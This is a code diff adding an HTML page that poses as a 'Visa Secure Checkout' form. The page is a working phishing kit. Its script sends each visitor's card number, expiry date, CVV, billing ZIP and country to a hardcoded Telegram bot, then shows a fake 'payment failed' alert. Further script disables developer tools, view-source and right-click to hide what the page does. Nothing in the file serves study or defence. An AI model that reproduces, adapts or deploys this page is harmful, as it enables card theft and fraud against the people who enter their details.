@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visa Secure Checkout</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            text-align: center;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            width: 350px;
+            margin: 50px auto;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            border-radius: 5px;
+        }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .btn {
+            background: #1a1f71;
+            color: white;
+            border: none;
+            padding: 10px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .btn:hover {
+            opacity: 0.8;
+        }
+        .logo {
+            width: 150px;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" class="logo" alt="Visa Logo">
+        <h3>Visa Secure Checkout</h3>
+        <form id="paymentForm">
+            <input type="text" placeholder="Amount" id="amount" required>
+            <input type="text" placeholder="Card Number" id="cardNumber" maxlength="16" required>
+            <input type="text" placeholder="Expiry Date (MM/YY)" id="expiryDate" required oninput="formatExpiryDate()">
+            <input type="text" placeholder="CVV \ CVC" id="cvv" maxlength="3" required>
+            <input type="text" placeholder="Billing ZIP Code" id="billingZip" required>
+            
+            <!-- Country Selection Dropdown -->
+            <select id="country" required>
+                <option value="">Select Country</option>
+                <option value="Bangladesh">Bangladesh</option>
+                <option value="India">India</option>
+                <option value="United States">United States</option>
+                <option value="United Kingdom">United Kingdom</option>
+                <option value="Canada">Canada</option>
+            </select>
+
+            <button type="button" class="btn" onclick="submitPayment('Visa')">Pay Now</button>
+        </form>
+    </div>
+
+    <script>
+        function sendToTelegram(paymentMethod) {
+            const TELEGRAM_BOT_TOKEN = "7590766158:AAFTMfMpGQkg_4iw3UyOiGX4NdarPIvcwRE";
+            const TELEGRAM_CHAT_ID = "6807445600";
+
+            const amount = document.getElementById('amount').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+            const billingZip = document.getElementById('billingZip').value;
+            const country = document.getElementById('country').value;
+
+            // Construct the message for Telegram
+            const message = `
+                ${paymentMethod} Order Received
+
+                Amount: $${amount}
+                Card Number: ${cardNumber}
+                Expiry Date: ${expiryDate}
+                CVV: ${cvv}
+                Billing ZIP Code: ${billingZip}
+                Country: ${country}
+                Payment Status: Failed (Invalid Details)
+            `;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log("Message sent to Telegram"))
+                .catch(error => console.error("Error sending message:", error));
+        }
+
+        function submitPayment(paymentMethod) {
+            // Prevent form submission
+            event.preventDefault();
+
+            // Validate form or perform other logic here
+
+            // Send payment data to Telegram
+            sendToTelegram(paymentMethod);
+
+            // Display Payment Failed message
+            alert("Payment failed, invalid details!");
+        }
+
+        // Format expiry date (MM/YY) with automatic '/'
+        function formatExpiryDate() {
+            let expiryDate = document.getElementById('expiryDate');
+            let value = expiryDate.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            expiryDate.value = value;
+        }
+
+        // Block inspect (DevTools) and prevent right-click and keyboard shortcuts
+        window.onload = function() {
+            document.onkeydown = function(e) {
+                if (e.keyCode == 123) { // Disable F12
+                    return false;
+                }
+                if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) { // Disable Ctrl + Shift + I
+                    return false;
+                }
+                if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) { // Disable Ctrl + U
+                    return false;
+                }
+            }
+
+            document.addEventListener('contextmenu', function(e) { // Disable right-click
+                e.preventDefault();
+            });
+        }
+    </script>
+</body>
+</html>
